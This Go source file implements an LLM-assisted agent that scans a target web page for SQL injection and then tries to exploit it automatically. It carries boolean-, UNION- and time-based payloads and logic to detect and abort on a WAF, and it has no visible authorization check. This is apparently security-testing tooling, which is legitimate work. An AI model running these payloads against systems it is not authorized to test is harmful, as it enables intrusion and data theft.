package specialist

import (
	"cal-project/internal/brain/llm"
	"cal-project/internal/brain/prompts"
	"cal-project/internal/core/agent"
	"cal-project/internal/core/bus"
	"cal-project/internal/core/reporter"
	"cal-project/internal/hands/tools"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/url"
	"regexp"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var sqliMessageCounter atomic.Uint64

// SQLInjectionSpecialist is a specialist agent focused on SQL Injection detection
type SQLInjectionSpecialist struct {
	id       string
	bus      bus.Bus
	brain    llm.LLM
	ctx      context.Context
	target   string
	executor tools.ToolExecutor
}

// NewSQLInjectionSpecialist creates a new SQLInjectionSpecialist agent
func NewSQLInjectionSpecialist(ctx context.Context, id string, eventBus bus.Bus, llmClient llm.LLM, target string, executor tools.ToolExecutor) *SQLInjectionSpecialist {
	return &SQLInjectionSpecialist{
		id:       id,
		bus:      eventBus,
		brain:    llmClient,
		ctx:      ctx,
		target:   target,
		executor: executor,
	}
}

func (s *SQLInjectionSpecialist) ID() string {
	return s.id
}

func (s *SQLInjectionSpecialist) Type() agent.AgentType {
	return agent.Specialist
}

func (s *SQLInjectionSpecialist) Run() error {
	log.Printf("[%s] Online. Hunting for SQL Injection vulnerabilities on: %s\n", s.id, s.target)
	return nil
}

func (s *SQLInjectionSpecialist) OnEvent(event bus.Event) {
	// Only process commands directed to this agent
	if event.Type == bus.Command && event.ToAgent == s.id {
		log.Printf("[%s] Received command: %v\n", s.id, event.Payload)
		go func() {
			defer func() {
				if rec := recover(); rec != nil {
					log.Printf("[%s] PANIC in executeTask: %v\n%s\n", s.id, rec, debug.Stack())
					s.reportError(event.FromAgent, fmt.Errorf("task panicked: %v", rec))
				}
			}()
			s.executeTask(event)
		}()
	}
}

// executeTask performs SQL injection vulnerability scanning
func (s *SQLInjectionSpecialist) executeTask(cmdEvent bus.Event) {
	taskDesc, ok := cmdEvent.Payload.(string)
	if !ok {
		log.Printf("[%s] Invalid task payload\n", s.id)
		return
	}

	log.Printf("[%s] Executing: %s\n", s.id, taskDesc)

	if s.executor == nil {
		s.reportObservation(cmdEvent.FromAgent, "SQLi scan skipped (Docker executor unavailable)")
		return
	}

	// Fetch HTTP response
	targetURL := s.replaceLocalhostForDocker(s.target)

	log.Printf("[%s] Fetching HTTP response from: %s\n", s.id, targetURL)
	httpOutput, err := tools.SimpleHTTPGet(s.ctx, s.executor, targetURL)
	if err != nil {
		log.Printf("[%s] HTTP request failed: %v\n", s.id, err)
		s.reportError(cmdEvent.FromAgent, err)
		return
	}

	// Use LLM to analyze for SQL injection vulnerabilities with ENHANCED PROMPT
	log.Printf("[%s] Analyzing for SQL injection vulnerabilities...\n", s.id)
	analysis := s.analyzeForSQLi(httpOutput)

	log.Printf("[%s] SQLi analysis complete\n", s.id)

	// Report candidate to Reporter if found
	s.reportCandidateIfFound(analysis)

	// ============================================================================
	// P1: Try to exploit if candidate was found
	// ============================================================================
	if strings.Contains(analysis, "VULNERABILITY CANDIDATE FOUND: Yes") {
		var location, parameter string

		// Extract location and parameter from analysis
		lines := strings.Split(analysis, "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "- LOCATION:") {
				location = strings.TrimSpace(strings.TrimPrefix(line, "- LOCATION:"))
			} else if strings.HasPrefix(line, "- VULNERABLE PARAMETER:") {
				parameter = strings.TrimSpace(strings.TrimPrefix(line, "- VULNERABLE PARAMETER:"))
			}
		}

		// Build target URL
		targetURL := s.target
		if location != "" && !strings.HasPrefix(location, "http") {
			if strings.HasPrefix(location, "/") {
				if parsedURL, err := url.Parse(s.target); err == nil {
					targetURL = fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, location)
				}
			}
		} else if location != "" {
			targetURL = location
		}

		// Attempt exploitation
		if parameter != "" {
			log.Printf("[%s] 🔥 Attempting SQLi exploitation on: %s (param: %s)\n", s.id, targetURL, parameter)
			exploited := s.exploitSQLi(targetURL, parameter)

			if !exploited {
				log.Printf("[%s] ⚠️ SQLi exploitation failed - false positive?\n", s.id)
			}
		} else {
			log.Printf("[%s] ⚠️ No parameter specified, skipping exploitation\n", s.id)
		}
	}

	// Generate report
	report := s.generateReport(httpOutput, analysis)

	s.reportObservation(cmdEvent.FromAgent, report)
}

func (s *SQLInjectionSpecialist) replaceLocalhostForDocker(targetURL string) string {
	if strings.Contains(targetURL, "localhost") || strings.Contains(targetURL, "127.0.0.1") {
		if parsedURL, err := url.Parse(targetURL); err == nil {
			hostname := parsedURL.Hostname()
			if hostname == "localhost" || hostname == "127.0.0.1" {
				parsedURL.Host = strings.Replace(parsedURL.Host, hostname, "host.docker.internal", 1)
				return parsedURL.String()
			}
		}
	}
	return targetURL
}

func (s *SQLInjectionSpecialist) analyzeForSQLi(httpResponse string) string {
	// OPTIMIZATION: Pattern matching first (skip LLM if clear SQL patterns found)
	if patternResult := s.patternMatchSQLi(httpResponse); patternResult != "" {
		log.Printf("[%s] Pattern match found SQLi indicators, skipping LLM\n", s.id)
		return patternResult
	}

	// Limit response size for LLM
	responseToAnalyze := httpResponse
	if len(httpResponse) > 4000 {
		responseToAnalyze = httpResponse[:4000]
	}

	prompt := prompts.GetSQLiAnalysis(responseToAnalyze)

	analysis, err := s.brain.Generate(s.ctx, prompt)
	if err != nil {
		log.Printf("[%s] LLM analysis failed: %v\n", s.id, err)
		return "❌ Unable to analyze (LLM error)"
	}

	return analysis
}

// patternMatchSQLi performs fast pattern matching for SQLi indicators
func (s *SQLInjectionSpecialist) patternMatchSQLi(httpResponse string) string {
	// SQL error patterns indicating vulnerability
	sqlErrorPatterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)mysql.*error`),
		regexp.MustCompile(`(?i)sql\s*syntax.*error`),
		regexp.MustCompile(`(?i)warning.*mysql`),
		regexp.MustCompile(`(?i)unclosed quotation mark`),
		regexp.MustCompile(`(?i)quoted string not properly terminated`),
		regexp.MustCompile(`(?i)ORA-\d{5}`), // Oracle errors
		regexp.MustCompile(`(?i)Microsoft.*ODBC.*SQL Server`),
		regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
		regexp.MustCompile(`(?i)SQLite.*error`),
	}

	// Check for SQL errors in response
	for _, pattern := range sqlErrorPatterns {
		if match := pattern.FindString(httpResponse); match != "" {
			log.Printf("[%s] SQL error detected: %s\n", s.id, match)
			return s.buildSQLiPatternResult(match)
		}
	}

	// Check for input forms that might be vulnerable
	formPattern := regexp.MustCompile(`<form[^>]*>`)
	inputPattern := regexp.MustCompile(`<input[^>]*name=["']([^"']+)["'][^>]*>`)

	if formPattern.MatchString(httpResponse) {
		inputs := inputPattern.FindAllStringSubmatch(httpResponse, -1)
		if len(inputs) > 0 {
			// Look for login/search forms
			for _, input := range inputs {
				if len(input) > 1 {
					paramName := strings.ToLower(input[1])
					if paramName == "id" || paramName == "user" || paramName == "username" ||
						paramName == "login" || paramName == "search" || paramName == "query" ||
						paramName == "password" || paramName == "email" {
						return s.buildSQLiFormResult(input[1])
					}
				}
			}
		}
	}

	return "" // Fallback to LLM
}

// buildSQLiPatternResult creates result from error pattern match
func (s *SQLInjectionSpecialist) buildSQLiPatternResult(errorMatch string) string {
	result := "VULNERABILITY CANDIDATE FOUND: Yes\n"
	result += fmt.Sprintf("- LOCATION: %s\n", s.target)
	result += "- VULNERABLE PARAMETER: TBD (SQL error detected in response)\n"
	result += "- CONFIDENCE: High (Error-based detection)\n"
	result += fmt.Sprintf("- REASONING: SQL error message found: %s\n", errorMatch)
	result += "- SUGGESTED PAYLOAD: ' OR '1'='1\n"
	return result
}

// buildSQLiFormResult creates result from form parameter match
func (s *SQLInjectionSpecialist) buildSQLiFormResult(paramName string) string {
	result := "VULNERABILITY CANDIDATE FOUND: Yes\n"
	result += fmt.Sprintf("- LOCATION: %s\n", s.target)
	result += fmt.Sprintf("- VULNERABLE PARAMETER: %s\n", paramName)
	result += "- CONFIDENCE: Medium (Pattern-based detection)\n"
	result += "- REASONING: Input form with potential SQL-injectable parameter detected\n"
	result += "- SUGGESTED PAYLOAD: ' OR '1'='1\n"
	return result
}

func (s *SQLInjectionSpecialist) generateReport(httpResponse string, analysis string) string {
	report := "=== SQL INJECTION SCAN REPORT ===\n\n"
	report += fmt.Sprintf("Target: %s\n\n", s.target)

	// SQL Injection Analysis
	report += "\n--- SQL Injection Vulnerability Analysis ---\n"
	report += analysis + "\n"

	return report
}

// reportCandidateIfFound parses LLM analysis and reports vulnerability candidate to Reporter
func (s *SQLInjectionSpecialist) reportCandidateIfFound(analysis string) {
	// Check if vulnerability was found
	if !strings.Contains(analysis, "VULNERABILITY CANDIDATE FOUND: Yes") {
		return
	}

	// Extract details from the analysis
	var location, parameter, reasoning string

	lines := strings.Split(analysis, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "- LOCATION:") {
			location = strings.TrimSpace(strings.TrimPrefix(line, "- LOCATION:"))
		} else if strings.HasPrefix(line, "- VULNERABLE PARAMETER:") {
			parameter = strings.TrimSpace(strings.TrimPrefix(line, "- VULNERABLE PARAMETER:"))
		} else if strings.HasPrefix(line, "- REASONING:") {
			reasoning = strings.TrimSpace(strings.TrimPrefix(line, "- REASONING:"))
		}
	}

	// Build full URL if location is relative
	fullURL := s.target
	if location != "" && !strings.HasPrefix(location, "http") {
		if strings.HasPrefix(location, "/") {
			// Parse base URL
			if parsedURL, err := url.Parse(s.target); err == nil {
				fullURL = fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, location)
			}
		}
	} else if location != "" {
		fullURL = location
	}

	// Create candidate
	candidate := reporter.VulnerabilityCandidate{
		Type:      "SQLi",
		URL:       fullURL,
		Parameter: parameter,
		Evidence:  analysis,
		Reasoning: reasoning,
		Timestamp: time.Now().Format(time.RFC1123),
		Status:    "pending",
	}

	// Send to Reporter
	candidateJSON, _ := json.Marshal(candidate)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-candidate-%d", s.id, sqliMessageCounter.Add(1)),
		FromAgent: s.id,
		ToAgent:   "Reporter-01",
		Type:      bus.Candidate,
		Payload:   string(candidateJSON),
	}
	s.bus.Publish("Reporter-01", event)
}

func (s *SQLInjectionSpecialist) reportObservation(toAgent string, observation string) {
	msgID := sqliMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-obs-%d", s.id, msgID),
		FromAgent: s.id,
		ToAgent:   toAgent,
		Type:      bus.Observation,
		Payload:   observation,
	}
	s.bus.Publish(toAgent, event)
}

func (s *SQLInjectionSpecialist) reportError(toAgent string, err error) {
	msgID := sqliMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-err-%d", s.id, msgID),
		FromAgent: s.id,
		ToAgent:   toAgent,
		Type:      bus.Error,
		Payload:   err.Error(),
	}
	s.bus.Publish(toAgent, event)
}

// ============================================================================
// SQLi Exploitation Functions (P1 Implementation)
// ============================================================================

// measureResponseTime measures the HTTP response time for a given URL
func (s *SQLInjectionSpecialist) measureResponseTime(targetURL string) (time.Duration, error) {
	// Create a context with timeout
	ctx, cancel := context.WithTimeout(s.ctx, 10*time.Second)
	defer cancel()

	startTime := time.Now()
	_, err := tools.SimpleHTTPGet(ctx, s.executor, targetURL)
	elapsed := time.Since(startTime)

	if err != nil {
		// Check if error is due to timeout
		if ctx.Err() == context.DeadlineExceeded {
			return elapsed, fmt.Errorf("request timeout after %v", elapsed)
		}
		return elapsed, err
	}

	return elapsed, nil
}

// buildSQLiURL constructs a URL with SQLi payload injected into the parameter
func (s *SQLInjectionSpecialist) buildSQLiURL(baseURL string, parameter string, payload string) string {
	// Parse the base URL
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		log.Printf("[%s] Failed to parse URL: %v\n", s.id, err)
		return baseURL
	}

	// Get existing query parameters
	queryParams := parsedURL.Query()

	// Inject payload into the parameter
	queryParams.Set(parameter, payload)

	// Update the URL with new query parameters
	parsedURL.RawQuery = queryParams.Encode()

	return parsedURL.String()
}

// verifyBooleanBased tests for Boolean-based Blind SQLi
// Returns (success, payload) if vulnerability is confirmed
func (s *SQLInjectionSpecialist) verifyBooleanBased(targetURL string, parameter string) (bool, string) {
	log.Printf("[%s] Testing Boolean-based Blind SQLi...\n", s.id)

	// True condition payload
	truePayload := "' OR '1'='1"
	trueURL := s.buildSQLiURL(targetURL, parameter, truePayload)
	trueURL = s.replaceLocalhostForDocker(trueURL)

	// False condition payload
	falsePayload := "' OR '1'='2"
	falseURL := s.buildSQLiURL(targetURL, parameter, falsePayload)
	falseURL = s.replaceLocalhostForDocker(falseURL)

	// Fetch response for true condition
	trueResponse, err := tools.SimpleHTTPGet(s.ctx, s.executor, trueURL)
	if err != nil {
		log.Printf("[%s] True condition request failed: %v\n", s.id, err)
		return false, ""
	}

	// Fetch response for false condition
	falseResponse, err := tools.SimpleHTTPGet(s.ctx, s.executor, falseURL)
	if err != nil {
		log.Printf("[%s] False condition request failed: %v\n", s.id, err)
		return false, ""
	}

	// Check for WAF
	if strings.Contains(trueResponse, "403 Forbidden") || strings.Contains(trueResponse, "ModSecurity") {
		log.Printf("[%s] WAF detected, aborting exploitation\n", s.id)
		return false, ""
	}

	// Compare response lengths (20% difference threshold)
	truLen := len(trueResponse)
	falseLen := len(falseResponse)

	diff := float64(truLen - falseLen)
	if falseLen > 0 {
		diffPercent := (diff / float64(falseLen)) * 100
		if diffPercent < 0 {
			diffPercent = -diffPercent
		}

		log.Printf("[%s] Response length diff: %.2f%% (true: %d, false: %d)\n", s.id, diffPercent, truLen, falseLen)

		if diffPercent >= 20.0 {
			log.Printf("[%s] ✅ Boolean-based SQLi confirmed!\n", s.id)
			return true, truePayload
		}
	}

	return false, ""
}

// verifyUnionBased tests for UNION-based SQLi
// Returns (success, payload) if vulnerability is confirmed
func (s *SQLInjectionSpecialist) verifyUnionBased(targetURL string, parameter string) (bool, string) {
	log.Printf("[%s] Testing UNION-based SQLi...\n", s.id)

	// UNION SELECT payloads
	payloads := []string{
		"' UNION SELECT NULL,@@version-- -",
		"' UNION SELECT NULL,database()-- -",
		"' UNION SELECT NULL,version()-- -",
		"1' UNION SELECT NULL,@@version-- -",
	}

	for _, payload := range payloads {
		testURL := s.buildSQLiURL(targetURL, parameter, payload)
		testURL = s.replaceLocalhostForDocker(testURL)

		response, err := tools.SimpleHTTPGet(s.ctx, s.executor, testURL)
		if err != nil {
			log.Printf("[%s] UNION payload request failed: %v\n", s.id, err)
			continue
		}

		// Check for WAF
		if strings.Contains(response, "403 Forbidden") || strings.Contains(response, "ModSecurity") {
			log.Printf("[%s] WAF detected, aborting exploitation\n", s.id)
			return false, ""
		}

		// Check for database version indicators
		lowerResponse := strings.ToLower(response)
		if strings.Contains(lowerResponse, "mysql") ||
			strings.Contains(lowerResponse, "mariadb") ||
			strings.Contains(lowerResponse, "postgresql") ||
			strings.Contains(lowerResponse, "sqlite") ||
			strings.Contains(lowerResponse, "oracle") ||
			strings.Contains(lowerResponse, "mssql") ||
			strings.Contains(response, "5.") || // MySQL version pattern
			strings.Contains(response, "10.") { // MariaDB version pattern

			log.Printf("[%s] ✅ UNION-based SQLi confirmed! DB info found in response\n", s.id)
			return true, payload
		}
	}

	return false, ""
}

// verifyTimeBased tests for Time-based Blind SQLi
// Returns (success, payload) if vulnerability is confirmed
func (s *SQLInjectionSpecialist) verifyTimeBased(targetURL string, parameter string) (bool, string) {
	log.Printf("[%s] Testing Time-based Blind SQLi...\n", s.id)

	// Measure baseline response time
	baselineURL := s.replaceLocalhostForDocker(targetURL)
	baselineTime, err := s.measureResponseTime(baselineURL)
	if err != nil {
		log.Printf("[%s] Baseline measurement failed: %v\n", s.id, err)
		return false, ""
	}

	log.Printf("[%s] Baseline response time: %.2fs\n", s.id, baselineTime.Seconds())

	// Time-based payloads (5 second delay)
	payloads := []string{
		"' AND SLEEP(5)-- -",
		"' OR SLEEP(5)-- -",
		"1' AND SLEEP(5)-- -",
		"' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
	}

	for _, payload := range payloads {
		testURL := s.buildSQLiURL(targetURL, parameter, payload)
		testURL = s.replaceLocalhostForDocker(testURL)

		sleepTime, err := s.measureResponseTime(testURL)

		// Check if timeout occurred (likely SQLi success)
		if err != nil && strings.Contains(err.Error(), "timeout") {
			log.Printf("[%s] ✅ Time-based SQLi confirmed! Request timed out (SLEEP worked)\n", s.id)
			return true, payload
		}

		if err != nil {
			log.Printf("[%s] Time-based payload failed: %v\n", s.id, err)
			continue
		}

		log.Printf("[%s] SLEEP payload response time: %.2fs\n", s.id, sleepTime.Seconds())

		// Check if response time increased by at least 4.5 seconds
		timeDiff := sleepTime.Seconds() - baselineTime.Seconds()
		if timeDiff >= 4.5 {
			log.Printf("[%s] ✅ Time-based SQLi confirmed! Time increased by %.2fs\n", s.id, timeDiff)
			return true, payload
		}
	}

	return false, ""
}

// reportVerifiedSQLi publishes a Finding event to Reporter
func (s *SQLInjectionSpecialist) reportVerifiedSQLi(vulnType string, targetURL string, payload string, evidence string) {
	finding := map[string]interface{}{
		"type":        vulnType,
		"url":         targetURL,
		"payload":     payload,
		"severity":    "High",
		"description": fmt.Sprintf("Verified %s vulnerability. \nEvidence: %s", vulnType, evidence),
		"timestamp":   time.Now().Format(time.RFC1123),
	}

	msgID := sqliMessageCounter.Add(1)
	event := bus.Event{
		ID:        fmt.Sprintf("%s-finding-%d", s.id, msgID),
		FromAgent: s.id,
		ToAgent:   "BROADCAST",
		Type:      bus.Finding,
		Payload:   finding,
	}
	s.bus.Publish("Reporter-01", event)

	log.Printf("[%s] ✅ Verified SQLi: %s at %s\n", s.id, vulnType, targetURL)
}

// SQLiResult holds the result of an SQLi technique test
type SQLiResult struct {
	Technique string
	Success   bool
	Payload   string
}

// exploitSQLi attempts to exploit SQLi vulnerability using multiple techniques (PARALLEL)
// Returns true if any technique succeeds
func (s *SQLInjectionSpecialist) exploitSQLi(targetURL string, parameter string) bool {
	results := make(chan SQLiResult, 3)
	var wg sync.WaitGroup

	// Run all three techniques in parallel
	wg.Add(3)

	// Boolean-based (fastest)
	go func() {
		defer wg.Done()
		success, payload := s.verifyBooleanBased(targetURL, parameter)
		results <- SQLiResult{Technique: "BooleanBased", Success: success, Payload: payload}
	}()

	// UNION-based
	go func() {
		defer wg.Done()
		success, payload := s.verifyUnionBased(targetURL, parameter)
		results <- SQLiResult{Technique: "UnionBased", Success: success, Payload: payload}
	}()

	// Time-based (slowest but most reliable) - skip for speed optimization
	go func() {
		defer wg.Done()
		// Skip time-based by default for speed (5+ seconds per test)
		// Uncomment below to enable
		// success, payload := s.verifyTimeBased(targetURL, parameter)
		// results <- SQLiResult{Technique: "TimeBased", Success: success, Payload: payload}
		results <- SQLiResult{Technique: "TimeBased", Success: false, Payload: ""}
	}()

	// Close results channel when all goroutines complete
	go func() {
		wg.Wait()
		close(results)
	}()

	// Check results - report first success
	for result := range results {
		if result.Success {
			evidence := fmt.Sprintf("%s SQLi confirmed with payload: %s", result.Technique, result.Payload)
			s.reportVerifiedSQLi("SQLi-"+result.Technique, targetURL, result.Payload, evidence)
			return true
		}
	}

	return false
}
